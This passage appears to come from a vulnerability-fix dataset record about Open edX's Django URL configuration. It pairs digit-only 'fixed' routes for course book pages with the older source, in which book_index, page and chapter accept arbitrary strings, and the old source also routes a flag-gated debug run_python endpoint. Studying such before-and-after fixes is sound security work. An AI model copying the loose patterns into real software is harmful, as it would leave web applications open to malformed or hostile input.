                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',"
                            ]
                        }
                    ],
                    "source": "\nfrom django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500' ",
                    "sourceWithComments": "from django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account', name='create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n     